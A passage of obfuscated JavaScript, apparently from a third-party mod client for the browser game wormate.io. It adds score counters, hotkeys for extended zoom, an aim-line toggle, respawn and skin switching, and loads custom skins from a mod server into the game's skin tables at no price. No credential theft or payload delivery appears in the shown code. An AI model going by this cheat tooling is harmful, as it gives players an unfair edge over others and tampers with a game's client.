g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0xac07ca.substring(0, 4))) {
        _0x356ed5 = true;
      }
    })(navigator.userAgent || navigator.vendor || window.opera);
    return _0x356ed5;
  }
  window.ctxx = {
    fontStyle: {
      amarelo: new PIXI.TextStyle({
        align: "center",
        fill: "#f8d968",
        fontSize: 10,
        lineJoin: "round",
        stroke: "red",
        strokeThickness: 1,
        whiteSpace: "normal",
        wordWrap: true
      }),
      serversStyle: new PIXI.TextStyle({
        align: "center",
        fill: "#fff009",
        fontSize: 11,
        lineJoin: "round",
        whiteSpace: "normal",
        wordWrap: true
      }),
      amarelo11: new PIXI.TextStyle({
        align: "center",
        fill: "#f8d968",
        fontSize: 10,
        lineJoin: "round",
        stroke: "red",
        strokeThickness: 1,
        whiteSpace: "normal",
        wordWrap: true
      }),
      branco: new PIXI.TextStyle({
        align: "center",
        fill: "#fff",
        fontSize: 10,
        lineJoin: "round",
        stroke: "#FFF",
        whiteSpace: "normal",
        wordWrap: true
      }),
      hsBranco: new PIXI.TextStyle({
        align: "center",
        fill: "#fff",
        fontSize: 10,
        lineJoin: "round",
        stroke: "#FFF",
        whiteSpace: "normal",
        wordWrap: true
      }),
      hsBrancoRight: new PIXI.TextStyle(_0x5078aa({
        align: "center",
        fill: "#fff",
        fontSize: 12,
        lineJoin: "round",
        stroke: "#FFF",
        whiteSpace: "normal",
        wordWrap: true
      }, "align", "right"))
    }
  };
  var _0x44ea23 = ["#FFD500", "#FFC75A", "#00B2ED", "#FF4544", "#0094D7", "#CCCF81", "#ff0999"];
  for (var _0x3b7d79 = 0; _0x3b7d79 < _0x44ea23.length; _0x3b7d79++) {
    var _0x55443d = _0x44ea23[_0x3b7d79];
    ctxx.fontStyle["tfc" + _0x3b7d79] = new PIXI.TextStyle({
      align: "center",
      fill: _0x55443d,
      fontSize: 25,
      lineJoin: "round",
      stroke: "black",
      strokeThickness: 1,
      whiteSpace: "normal",
      wordWrap: true,
      fontWeight: "bold"
    });
  }
  ctxx.label_hs = new PIXI.Text("HS", ctxx.fontStyle.amarelo);
  ctxx.label_hs.x = 25;
  ctxx.label_hs.y = 107;
  ctxx.label_hs.anchor.x = 0.5;
  ctxx.hs = new PIXI.Text("0", ctxx.fontStyle.amarelo);
  ctxx.hs.x = 25;
  ctxx.hs.y = 120;
  ctxx.hs.anchor.x = 0.5;
  ctxx.hsTotal = new PIXI.Text("0", ctxx.fontStyle.amarelo);
  ctxx.hsTotal.x = 25;
  ctxx.hsTotal.y = 133;
  ctxx.hsTotal.anchor.x = 0.5;
  ctxx.label_kill = new PIXI.Text("KILL", ctxx.fontStyle.branco);
  ctxx.label_kill.x = 75;
  ctxx.label_kill.y = 107;
  ctxx.label_kill.anchor.x = 0.5;
  ctxx.kill = new PIXI.Text("0", ctxx.fontStyle.branco);
  ctxx.kill.x = 75;
  ctxx.kill.y = 120;
  ctxx.kill.anchor.x = 0.5;
  ctxx.killTotal = new PIXI.Text("0", ctxx.fontStyle.branco);
  ctxx.killTotal.x = 75;
  ctxx.killTotal.y = 133;
  ctxx.killTotal.anchor.x = 0.5;
  ctxx.clock = PIXI.Sprite.from(atob(savedImages[8]));
  ctxx.clock.width = 100;
  ctxx.clock.height = 100;
  ctxx.clock.x = -50;
  ctxx.clock.y = -50;
  ctxx.containerCountInfo = new PIXI.Container();
  ctxx.containerCountInfo.x = -45;
  ctxx.containerCountInfo.y = -52;
  ctxx.containerCountInfo.addChild(ctxx.label_hs);
  ctxx.containerCountInfo.addChild(ctxx.hs);
  ctxx.containerCountInfo.addChild(ctxx.hsTotal);
  ctxx.containerCountInfo.addChild(ctxx.label_kill);
  ctxx.containerCountInfo.addChild(ctxx.kill);
  ctxx.containerCountInfo.addChild(ctxx.killTotal);
  ctxx.containerCountInfo.addChild(ctxx.clock);
  ctxx.labelRoom = new PIXI.Text("?", ctxx.fontStyle.serversStyle);
  ctxx.addRoom = function (_0x1fcd10) {
    ctxx.labelRoom.text = _0x1fcd10 || "?";
  };
  window.addEventListener("keydown", function (_0x2418a6) {
    if (_0x2418a6.code == "KeyW") {
      _0x129bb0(_0x5d648b ? 0 : 7);
    }
    if (_0x2418a6.code == "KeyQ") {
      _0x129bb0(_0x5d648b ? 0 : 8);
    }
    if (_0x2418a6.key === "8" && _0x261341.setIntervalRun) {
      _0x16c0a6 = !_0x16c0a6;
    }
    if (_0x2418a6.code === "KeyB" && _0x261341.setIntervalRun) {
      window.vps.bannedWordsEnabled = !window.vps.bannedWordsEnabled;
      localStorage.setItem("SaveGamewup", JSON.stringify(window.vps));
      setTimeout(_0xfd33c2, 50);
    }
    if (_0x2418a6.keyCode === 82 || _0x2418a6.code === "KeyR") {
      respawnFn();
    }
    if (_0x2418a6.code === "KeyL") {
      var _0x2e5f19 = _wup._anApp.og.af.ng.mf.getChildByName("lineHS");
      if (_0x2e5f19) {
        vps.laserActive = !vps.laserActive;
        if (vps.laserActive) {
          _0x2e5f19.alpha = vps.laserOpacity || 0.3;
        } else {
          _0x2e5f19.alpha = 0;
        }
      }
    }
    if (_0x2418a6.key === "5") {
      var _0x3c6aaa = parseInt(vps.background) || 0;
      var _0x3ced7c = _0x3c6aaa + 1;
      if (_0x3ced7c >= backgroundArena.length) {
        _0x3ced7c = 0;
      }
      vps.background = _0x3ced7c;
      vps.backgroundUri = null;
      _0x380234.xe._g = _0x261341.bgg(_0x3ced7c);
      localStorage.setItem("SaveGamewup", JSON.stringify(vps));
      _wup._anApp.og.af.ng.Lg.$g(_0x380234.xe._g);
      $("#backgroundArena").val(_0x3ced7c);
      if (typeof updateBackgroundSelection === "function") {
        setTimeout(updateBackgroundSelection, 100);
      }
    }
    if (_0x2418a6.key === "1") {
      gtr.gtr_skinr();
    }
    if (_0x2418a6.key === "x1") {
      _wupin.update(1);
    }
    if (_0x2418a6.key === "x2") {
      _wupin.update(2);
    }
    if ((_0x2418a6.key === "<" || _0x2418a6.key === ",") && _0x261341.setIntervalRun) {
      gtr.gtrass1();
    }
    if ((_0x2418a6.key === ">" || _0x2418a6.key === ".") && _0x261341.setIntervalRun) {
      gtr.gtrass2();
    }
    if (_0x2418a6.keyCode === 90 && _0x261341.setIntervalRun) {
      _0x1de86b = vps.configZoom?.closeDown || 1;
    }
    if (_0x2418a6.keyCode === 67 && _0x261341.setIntervalRun) {
      _0x1de86b = _0x1de86b === 0.5 ? 2 : vps.configZoom?.closeUp || 0.25;
    }
    if (_0x5d648b !== null) {
      if (_0x2418a6.code !== "KeyQ" && _0x2418a6.code !== "KeyW") {
        clearInterval(_0x5d648b);
        _0x380234.og.af.ng.Eb.addEventListener("pointermove", gtr.onmovepoint, true);
        _0x5d648b = null;
      }
    }
  });
  var _0x380234 = {
    Lc: {
      Gb: {}
    }
  };
  window.applyBackgroundFromWindow = function (_0x24aa5d) {
    try {
      if (_0x24aa5d >= 0 && _0x24aa5d < window.backgroundArena.length) {
        vps.background = _0x24aa5d;
        vps.backgroundUri = null;
        _0x380234.xe._g = _0x261341.bgg(_0x24aa5d);
        localStorage.setItem("SaveGamewup", JSON.stringify(vps));
        try {
          if (window._wup && window._wup.anApp && window._wup.anApp.og) {
            _wup.anApp.og.af.ng.Lg.$g(_0x380234.xe._g);
          }
        } catch (_0x4f4616) {}
        return true;
      }
    } catch (_0x1dd231) {
      console.log("Failed to apply background:", _0x1dd231);
    }
    return false;
  };
  var _0x261341 = {
    pm: {},
    ps: 0,
    fixTextureUrls: function (_0x4236e5) {
      for (var _0xbc3208 in _0x4236e5) {
        if (_0xbc3208.includes("custom_skin_") || _0xbc3208.includes("custom_wear_")) {
          delete _0x4236e5[_0xbc3208].relativePath;
          delete _0x4236e5[_0xbc3208].re1ativePath;
        }
      }
      for (var _0xbc3208 in _0x4236e5) {
        var _0x253e14 = _0x4236e5[_0xbc3208];
        if (_0x253e14.url && _0x253e14.url.includes("/wormate.io/")) {
          _0x253e14.url = _0x253e14.url.replace("/wormate.io/", "/resources.wormate.io/");
        }
        if (_0x253e14.relativePath && !_0x253e14.relativePath.startsWith("http")) {
          if (_0x253e14.relativePath.startsWith("/")) {
            _0x253e14.relativePath = "https://resources.wormate.io" + _0x253e14.relativePath;
          } else {
            _0x253e14.relativePath = "https://resources.wormate.io/" + _0x253e14.relativePath;
          }
        }
        if (_0x253e14.custom) {
          delete _0x253e14.relativePath;
          delete _0x253e14.re1ativePath;
          delete _0x253e14.url;
        }
      }
      return _0x4236e5;
    },
    decryptImageData: function (_0x471520) {
      if (!_0x471520 || typeof _0x471520 !== "string") {
        return _0x471520;
      }
      var _0x37c796 = this.skinSystem.c_v;
      if (_0x471520.length > _0x37c796) {
        return _0x471520.substring(_0x37c796) + _0x471520.substring(0, _0x37c796);
      }
      return _0x471520;
    },
    processLocalStorageData: function () {
      var _0x29f682 = {
        textureDict: {},
        regionDict: {},
        skinArrayDict: [],
        skinGroupArrayDict: []
      };
      try {
        var _0x1f0f5e = localStorage.getItem("custom_skin");
        if (_0x1f0f5e && _0x1f0f5e !== "null") {
          var _0x12439f = JSON.parse(_0x1f0f5e);
          var _0x3825ec = this.processCustomSkinData(_0x12439f);
          this.mergeProcessedData(_0x29f682, _0x3825ec);
        }
      } catch (_0x1cac02) {
        console.error("Error processing custom skin:", _0x1cac02);
      }
      try {
        var _0x5a23e0 = localStorage.getItem("custom_wear");
        if (_0x5a23e0 && _0x5a23e0 !== "null") {
          var _0x57480c = JSON.parse(_0x5a23e0);
          var _0x3da328 = this.processCustomWearData(_0x57480c);
          this.mergeProcessedData(_0x29f682, _0x3da328);
        }
      } catch (_0x4a94f5) {
        console.error("Error processing custom wear:", _0x4a94f5);
      }
      return _0x29f682;
    },
    processCustomSkinData: function (_0x5e766b) {
      var _0x540599 = {
        textureDict: {},
        regionDict: {},
        skinArrayDict: [],
        skinGroupArrayDict: []
      };
      try {
        if (_0x5e766b.csg) {
          this.processAnimatedGifSkins(_0x5e766b.csg, _0x540599);
        } else {
          this.processRegularCustomSkins(_0x5e766b, _0x540599);
        }
      } catch (_0x124640) {
        console.error("Error in processCustomSkinData:", _0x124640);
      }
      return _0x540599;
    },
    processRegularCustomSkins: function (_0x53eb52, _0x3ff7f6) {
      var _0x59b2f6 = [];
      for (var _0x5b3a33 in _0x53eb52) {
        if (_0x5b3a33 !== "img") {
          try {
            var _0x2aead5 = _0x53eb52[_0x5b3a33];
            if (_0x2aead5 && _0x2aead5.textureDict && _0x2aead5.textureDict[_0x5b3a33]) {
              var _0x36a0e6 = _0x2aead5.textureDict[_0x5b3a33].file;
              if (_0x36a0e6 && _0x36a0e6.search("data:image/png;base64,") === -1) {
                var _0x25f578 = this.decryptImageData(_0x36a0e6);
                _0x2aead5.textureDict[_0x5b3a33].file = "data:image/png;base64," + _0x25f578;
              }
              _0x3ff7f6.textureDict[_0x5b3a33] = _0x2aead5.textureDict[_0x5b3a33];
              if (_0x2aead5.regionDict) {
                for (var _0x56255c in _0x2aead5.regionDict) {
                  _0x3ff7f6.regionDict[_0x56255c] = _0x2aead5.regionDict[_0x56255c];
                }
              }
              if (_0x2aead5.skin) {
                _0x3ff7f6.skinArrayDict.push(_0x2aead5.skin);
                _0x59b2f6.push(_0x2aead5.skin.id);
              }
            }
          } catch (_0x16634a) {
            console.error("Error processing skin:", _0x5b3a33, _0x16634a);
          }
        }
      }
      if (_0x59b2f6.length > 0) {
        _0x3ff7f6.skinGroupArrayDict.push({
          isCustom: true,
          id: "customer",
          img: atob(savedImages[33]),
          name: {
            de: "Customer",
            en: "Customer",
            es: "Customer",
            fr: "Customer",
            uk: "Customer"
          },
          list: _0x59b2f6
        });
      }
    },
    processCustomWearData: function (_0x1d2ce1) {
      var _0x2c1109 = {
        textureDict: {},
        regionDict: {},
        eyesDict: {},
        mouthDict: {},
        hatDict: {},
        glassesDict: {}
      };
      try {
        if (_0x1d2ce1.wear) {
          for (var _0x5b4140 in _0x1d2ce1.wear.textureDict) {
            var _0x1ff5de = _0x1d2ce1.wear.textureDict[_0x5b4140];
            if (_0x1ff5de.file && _0x1ff5de.file.search("data:image/png;base64,") === -1) {
              _0x1ff5de.file = "data:image/png;base64," + this.decryptImageData(_0x1ff5de.file);
            }
            _0x2c1109.textureDict[_0x5b4140] = _0x1ff5de;
          }
          for (var _0x18bd98 in _0x1d2ce1.wear.regionDict) {
            var _0x24e539 = _0x1d2ce1.wear.regionDict[_0x18bd98];
            _0x2c1109.regionDict[_0x18bd98] = _0x24e539;
          }
        }
      } catch (_0x4b2005) {
        console.error("Error processing custom wear:", _0x4b2005);
      }
      return _0x2c1109;
    },
    mergeAllSkinData: function (_0x5af06e, _0x41ddfc, _0x1e7c44) {
      try {
        var _0x58e379 = JSON.parse(JSON.stringify(_0x5af06e));
        _0x58e379.textureDict = this.fixTextureUrls(_0x58e379.textureDict);
        this.mergeServerData(_0x58e379, _0x41ddfc);
        this.mergeProcessedData(_0x58e379, _0x1e7c44);
        return _0x58e379;
      } catch (_0xd99961) {
        console.error("Error in mergeAllSkinData:", _0xd99961);
        return _0x5af06e;
      }
    },
    mergeServerData: function (_0xaf57d7, _0x470957) {
      if (!_0x470957) {
        console.warn("No custom data provided - using fallback");
        return;
      }
      try {
        var _0x2e43a9 = {
          texturesProcessed: 0,
          regionsProcessed: 0,
          eyesProcessed: 0,
          mouthProcessed: 0,
          hatProcessed: 0,
          glassesProcessed: 0,
          skinsProcessed: 0,
          errors: []
        };
        if (_0x470957.textureDict) {
          for (var _0x4f03d8 in _0x470957.textureDict) {
            try {
              var _0x184f3c = _0x470957.textureDict[_0x4f03d8];
              if (_0x184f3c.file) {
                if (!_0x184f3c.file.startsWith("data:image/")) {
                  _0x184f3c.file = "data:image/png;base64," + _0x184f3c.file;
                }
                _0x184f3c.custom = true;
                _0x184f3c.h1 = true;
                _0x184f3c.h4 = true;
                delete _0x184f3c.relativePath;
                delete _0x184f3c.re1ativePath;
              }
              _0xaf57d7.textureDict[_0x4f03d8] = _0x184f3c;
              _0x2e43a9.texturesProcessed++;
            } catch (_0x5402dd) {
              console.error("Error processing texture:", _0x4f03d8, _0x5402dd);
              _0x2e43a9.errors.push("Texture " + _0x4f03d8 + ": " + _0x5402dd.message);
            }
          }
        }
        if (_0x470957.regionDict) {
          for (var _0x4a38d0 in _0x470957.regionDict) {
            try {
              var _0x325f39 = _0x470957.regionDict[_0x4a38d0];
              if (_0x325f39.texture && !_0xaf57d7.textureDict[_0x325f39.texture]) {
                console.warn("Region references missing texture:", _0x4a38d0, _0x325f39.texture);
                _0x2e43a9.errors.push("Region " + _0x4a38d0 + " references missing texture: " + _0x325f39.texture);
                continue;
              }
              _0xaf57d7.regionDict[_0x4a38d0] = _0x325f39;
              _0x2e43a9.regionsProcessed++;
            } catch (_0x2a684d) {
              console.error("Error processing region:", _0x4a38d0, _0x2a684d);
              _0x2e43a9.errors.push("Region " + _0x4a38d0 + ": " + _0x2a684d.message);
            }
          }
        }
        var _0x38300f = [{
          type: "eyesDict",
          variantArray: "eyesVariantArray",
          label: "العيون"
        }, {
          type: "mouthDict",
          variantArray: "mouthVariantArray",
          label: "الأفواه"
        }, {
          type: "hatDict",
          variantArray: "hatVariantArray",
          label: "القبعات"
        }, {
          type: "glassesDict",
          variantArray: "glassesVariantArray",
          label: "النظارات"
        }];
        _0x38300f.forEach(function (_0x47b4e9) {
          var _0x65d27d = _0x47b4e9.type;
          var _0x2d4258 = _0x47b4e9.variantArray;
          var _0x5ac034 = _0x47b4e9.label;
          if (_0x470957[_0x65d27d]) {
            if (!_0xaf57d7[_0x65d27d]) {
              _0xaf57d7[_0x65d27d] = {};
            }
            for (var _0x594208 in _0x470957[_0x65d27d]) {
              try {
                var _0x49a5f4 = _0x470957[_0x65d27d][_0x594208];
                if (!_0x49a5f4.base || !Array.isArray(_0x49a5f4.base)) {
                  console.warn("Invalid wear item structure:", _0x594208);
                  _0x2e43a9.errors.push(_0x5ac034 + " " + _0x594208 + ": Invalid structure");
                  continue;
                }
                var _0x13d1fb = [];
                _0x49a5f4.base.forEach(function (_0x17c010) {
                  var _0x3fc925 = _0x17c010.region || _0x17c010;
                  if (!_0xaf57d7.regionDict[_0x3fc925]) {
                    _0x13d1fb.push(_0x3fc925);
                  }
                });
                if (_0x13d1fb.length > 0) {
                  console.warn(_0x5ac034 + " " + _0x594208 + " has missing regions:", _0x13d1fb);
                  _0x2e43a9.errors.push(_0x5ac034 + " " + _0x594208 + ": Missing regions: " + _0x13d1fb.join(", "));
                  continue;
                }
                _0x49a5f4.custom = true;
                _0x49a5f4.guest = true;
                _0x49a5f4.nonbuyable = true;
                if (!_0x49a5f4.hasOwnProperty("price")) {
                  _0x49a5f4.price = 0;
                }
                _0xaf57d7[_0x65d27d][_0x594208] = _0x49a5f4;
                switch (_0x65d27d) {
                  case "eyesDict":
                    _0x2e43a9.eyesProcessed++;
                    break;
                  case "mouthDict":
                    _0x2e43a9.mouthProcessed++;
                    break;
                  case "hatDict":
                    _0x2e43a9.hatProcessed++;
                    break;
                  case "glassesDict":
                    _0x2e43a9.glassesProcessed++;
                    break;
                }
              } catch (_0x48adab) {
                console.error("Error processing " + _0x5ac034 + " item:", _0x594208, _0x48adab);
                _0x2e43a9.errors.push(_0x5ac034 + " " + _0x594208 + ": " + _0x48adab.message);
              }
            }
            if (!_0xaf57d7[_0x2d4258]) {
              _0xaf57d7[_0x2d4258] = [];
            }
            var _0x143c66 = new Set();
            _0xaf57d7[_0x2d4258].forEach(function (_0x59ebeb) {
              if (Array.isArray(_0x59ebeb) && _0x59ebeb.length > 0) {
                _0x143c66.add(_0x59ebeb[0]);
              }
            });
            if (_0x470957[_0x2d4258] && Array.isArray(_0x470957[_0x2d4258])) {
              _0xaf57d7[_0x2d4258] = _0xaf57d7[_0x2d4258].concat(_0x470957[_0x2d4258]);
            } else {
              Object.keys(_0x470957[_0x65d27d]).forEach(function (_0x4007aa) {
                if (!_0x143c66.has(_0x4007aa)) {
                  _0xaf57d7[_0x2d4258].push([parseInt(_0x4007aa)]);
                }
              });
            }
          } else {}
        });
        if (_0x470957.skinArrayDict && Array.isArray(_0x470957.skinArrayDict)) {
          _0x470957.skinArrayDict.forEach(function (_0x251c93, _0x3cf284) {
            try {
              if (!_0x251c93.id || !_0x251c93.base || !Array.isArray(_0x251c93.base)) {
                console.warn("Invalid skin structure at index:", _0x3cf284);
                _0x2e43a9.errors.push("Skin at index " + _0x3cf284 + ": Invalid structure");
                return;
              }
              var _0x3f8517 = [];
              _0x251c93.base.forEach(function (_0x318c14) {
                if (!_0xaf57d7.regionDict[_0x318c14]) {
                  _0x3f8517.push(_0x318c14);
                }
              });
              if (_0x3f8517.length > 0) {
                console.warn("Skin " + _0x251c93.id + " has missing regions:", _0x3f8517);
                _0x2e43a9.errors.push("Skin " + _0x251c93.id + ": Missing regions: " + _0x3f8517.join(", "));
                return;
              }
              _0x251c93.custom = true;
              _0x251c93.guest = true;
              _0x251c93.nonbuyable = true;
              if (!_0x251c93.hasOwnProperty("price")) {
                _0x251c93.price = 0;
              }
              _0xaf57d7.skinArrayDict.push(_0x251c93);
              _0x2e43a9.skinsProcessed++;
            } catch (_0x3a08ce) {
              console.error("Error processing skin at index:", _0x3cf284, _0x3a08ce);
              _0x2e43a9.errors.push("Skin at index " + _0x3cf284 + ": " + _0x3a08ce.message);
            }
          });
        }
        if (_0x470957.skinGroupArrayDict && Array.isArray(_0x470957.skinGroupArrayDict)) {
          if (!_0xaf57d7.skinGroupArrayDict) {
            _0xaf57d7.skinGroupArrayDict = [];
          }
          _0x470957.skinGroupArrayDict.forEach(function (_0x3e6069, _0x5ab0d6) {
            try {
              if (!_0x3e6069.id || !_0x3e6069.list || !Array.isArray(_0x3e6069.list)) {
                console.warn("Invalid skin group structure at index:", _0x5ab0d6);
                _0x2e43a9.errors.push("Skin group at index " + _0x5ab0d6 + ": Invalid structure");
                return;
              }
              if (!_0x3e6069.name) {
                _0x3e6069.name = {
                  en: "Custom Group " + _0x3e6069.id,
                  ar: "مجموعة مخصصة " + _0x3e6069.id
                };
              }
              _0xaf57d7.skinGroupArrayDict.push(_0x3e6069);
            } catch (_0x156401) {
              _0x2e43a9.errors.push("Skin group at index " + _0x5ab0d6 + ": " + _0x156401.message);
            }
          });
        }
        if (_0x2e43a9.errors.length > 0) {
          console.warn("Processing errors encountered:", _0x2e43a9.errors.length);
          _0x2e43a9.errors.forEach(function (_0x569b9c, _0x1b5cec) {
            console.warn("Error " + (_0x1b5cec + 1) + ":", _0x569b9c);
          });
        }
      } catch (_0x173a36) {
        console.error("Critical error in mergeServerData:", _0x173a36);
        console.error("Stack trace:", _0x173a36.stack);
        try {
          if (_0x470957.textureDict) {
            Object.assign(_0xaf57d7.textureDict, _0x470957.textureDict);
          }
          if (_0x470957.regionDict) {
            Object.assign(_0xaf57d7.regionDict, _0x470957.regionDict);
          }
          console.log("Applied basic fallback merge");
        } catch (_0x8ebae8) {
          console.error("Even fallback merge failed:", _0x8ebae8);
        }
      }
    },
    mergeProcessedData: function (_0x1255c7, _0x2636bf) {
      if (!_0x2636bf) {
        return;
      }
      try {
        if (_0x2636bf.textureDict) {
          Object.assign(_0x1255c7.textureDict, _0x2636bf.textureDict);
        }
        if (_0x2636bf.regionDict) {
          Object.assign(_0x1255c7.regionDict, _0x2636bf.regionDict);
        }
        if (_0x2636bf.skinArrayDict && Array.isArray(_0x2636bf.skinArrayDict)) {
          _0x1255c7.skinArrayDict = _0x1255c7.skinArrayDict.concat(_0x2636bf.skinArrayDict);
        }
        if (_0x2636bf.skinGroupArrayDict && Array.isArray(_0x2636bf.skinGroupArrayDict)) {
          if (!_0x1255c7.skinGroupArrayDict) {
            _0x1255c7.skinGroupArrayDict = [];
          }
          _0x1255c7.skinGroupArrayDict = _0x1255c7.skinGroupArrayDict.concat(_0x2636bf.skinGroupArrayDict);
        }
      } catch (_0x12537f) {
        console.error("Error in mergeProcessedData:", _0x12537f);
      }
    },
    registry: function () {
      var _0xc353d9 = _0x16316f(_0x51aacb().mark(function _0x315974(_0x92a947) {
        var _0x3266f2;
        var _0x3c5a1c;
        var _0x2a7162;
        return _0x51aacb().wrap(function _0x1097b2(_0x17c930) {
          while (1) {
            switch (_0x17c930.prev = _0x17c930.next) {
              case 0:
                _0x17c930.prev = 0;
                _0x17c930.next = 3;
                return Promise.resolve(_0x92a947 || {
                  textureDict: {},
                  regionDict: {},
                  skinArrayDict: [],
                  eyesDict: {},
                  mouthDict: {},
                  hatDict: {},
                  glassesDict: {}
                });
              case 3:
                _0x3266f2 = _0x17c930.sent;
                _0x17c930.next = 6;
                return fetch(window.vps.s_l + "/store", {
                  headers: {
                    "Content-Type": "application/json"
                  },
                  method: "POST",
                  body: JSON.stringify({
                    country: localStorage.getItem("oco") || "gb",
                    v: "v2",
                    action: "get_textures"
                  })
                }).then(function (_0x40570c) {
                  if (!_0x40570c.ok) {
                    throw new Error("Custom data fetch failed: " + _0x40570c.status);
                  }
                  return _0x40570c.json();
                }).then(function (_0xd21f38) {
                  return _0xd21f38;
                }).catch(function (_0x3b2884) {
                  console.warn("Failed to fetch custom textures:", _0x3b2884);
                  return {
                    textureDict: {},
                    regionDict: {},
                    skinArrayDict: []
                  };
                });
              case 6:
                _0x3c5a1c = _0x17c930.sent;
                _0x2a7162 = _0x261341.processLocalStorageData();
                _0x3266f2 = _0x261341.mergeAllSkinData(_0x3266f2, _0x3c5a1c, _0x2a7162);
                return _0x17c930.abrupt("return", _0x3266f2);
              case 11:
                _0x17c930.prev = 11;
                _0x17c930.t0 = _0x17c930.catch(0);
                console.error("Registry error:", _0x17c930.t0);
                return _0x17c930.abrupt("return", _0x92a947 || {
                  textureDict: {},
                  regionDict: {},
                  skinArrayDict: []
                });
              case 15:
              case "end":
                return _0x17c930.stop();
            }
          }
        }, _0x315974, null, [[0, 11]]);
      }));
      function _0x589c0a(_0x49c660) {
        return _0xc353d9.apply(this, arguments);
      }
      return _0x589c0a;
    }(),
    ps3: function _0x2a5199() {
      _0x380234.dh.xq(_0x380234.og.af.Gn(), _0x380234.og.af.Hn());
    },
    setIntervalRun: null,
    loadBg: false,
    LG: function _0x4aa163(_0x17a881, _0x20eb48, _0x430594) {
      _0x17a881.Ll("gg", _0x430594.credential, null);
    },
    Lg: function _0x767981(_0x5e7e78) {
      _0x380234.xe._g = _0x261341.bgg(vps.background || 0);
      _wup.$C = _0x5e7e78;
      _wup.$W = _0x261341;
      if (vps.bgGameWidth > 512) {
        return new _0x5e7e78.WMGBS1();
      } else {
        return new _0x5e7e78.WMGBS2();
      }
    }
  };
  window.gameManager = _0x261341;
  _0x261341.Vd = function (_0x2cb52f, _0xfeb09c) {
    _wup.customConfig(_0x2cb52f);
    if (!_0x2cb52f) {
      return;
    }
    var _0x55456a = this;
    function _0x37546b(_0x70b736) {
      var _0x26f870 = _0xfeb09c.Id.Ld;
      _0x55456a.Rd(_0x26f870, _0xfeb09c.Od.bc(_0x26f870).lc(_0x70b736));
    }
    if (this.Fd) {
      this.Pd();
      return;
    }
    var _0x387918 = [];
    var _0xd77fea = [];
    var _0x5cc4a6 = 0;
    var _0x2dc3e6 = new PIXI.Loader();
    for (var _0x353564 in _0x2cb52f.textureDict) {
      if (_0x2cb52f.textureDict.hasOwnProperty(_0x353564)) {
        var _0x51eaa3 = _0x2cb52f.textureDict[_0x353564];
        if (_0x51eaa3.custom) {
          let _0x341e9c = null;
          if (_0x51eaa3.file && _0x51eaa3.file.startsWith("data:image/")) {
            _0x341e9c = _0x51eaa3.file;
          } else if (_0x51eaa3.relativePath) {
            if (_0x51eaa3.relativePath.startsWith("http") || _0x51eaa3.relativePath.startsWith("data:image/")) {
              _0x341e9c = _0x51eaa3.relativePath;
            } else {
              _0x341e9c = "" + window.vps.s_l + _0x51eaa3.relativePath;
            }
          } else if (_0x51eaa3.file) {
            if (_0x51eaa3.file.startsWith("data:image/")) {
              _0x341e9c = _0x51eaa3.file;
            } else {
              _0x341e9c = "data:image/png;base64," + _0x51eaa3.file;
            }
          } else if (_0x51eaa3.re1ativePath) {
            if (_0x51eaa3.re1ativePath.startsWith("http") || _0x51eaa3.re1ativePath.startsWith("data:image/")) {
              _0x341e9c = _0x51eaa3.re1ativePath;
            } else {
              _0x341e9c = "" + window.vps.s_l + _0x51eaa3.re1ativePath;
            }
          }
          if (_0x341e9c) {
            var _0x27a74f = {
              ae: _0x353564,
              custom: true,
              textureUrl: _0x341e9c,
              resource: null
            };
            _0x387918.push(_0x27a74f);
            if (_0x341e9c.startsWith("http")) {
              _0x2dc3e6.add(_0x353564, _0x341e9c, {
                crossOrigin: "anonymous",
                timeout: 16000,
                loadType: 2
              });
            } else if (_0x341e9c.startsWith("data:image/")) {
              const _0x37bf82 = PIXI.Texture.from(_0x341e9c);
              _0x27a74f.resource = {
                texture: _0x37bf82
              };
            }
          }
          continue;
        }
        var _0x14e393 = _0x51eaa3.re1ativePath || _0x51eaa3.relativePath;
        var _0x441f8d = _0x51eaa3.fileSize || 100;
        var _0x47b1ef = _0x51eaa3.sha256 || null;
        if (_0x14e393) {
          let _0x5dd6a0 = _0x14e393;
          if (!_0x5dd6a0.startsWith("http")) {
            _0x5dd6a0 = "https://resources.wormate.io/dynamic/assets/" + _0x5dd6a0;
          }
          var _0x2d27a2 = new _0xfeb09c.Wd(_0x353564, _0x5dd6a0, _0x441f8d, _0x47b1ef);
          _0x2d27a2.h1 = _0x51eaa3.h1;
          _0x2d27a2.h4 = _0x51eaa3.h4;
          _0x2d27a2.skinEvo = _0x51eaa3.skinEvo;
          _0x2d27a2.lines = _0x51eaa3.lines;
          _0x2d27a2.speed = _0x51eaa3.speed;
          _0x387918.push(_0x2d27a2);
          _0x2dc3e6.add(_0x353564, _0x5dd6a0);
        }
      }
    }
    _0x2dc3e6.onProgress.add(function (_0x271892, _0x48e9e5) {
      _0x37546b(_0x271892.progress / 100);
    });
    _0x2dc3e6.load(function (_0x262542, _0x58849a) {
      _0x387918.forEach(function (_0x5c3ffc) {
        _0x5c3ffc.resource = _0x58849a[_0x5c3ffc.ae];
      });
      _0x55456a.$d(_0x2cb52f, _0x387918, _0xfeb09c);
    });
    return;
  };
  _0x261341.Zd = function (_0x25861a, _0x2f1d1b, _0x278565, _0x33ed2d) {
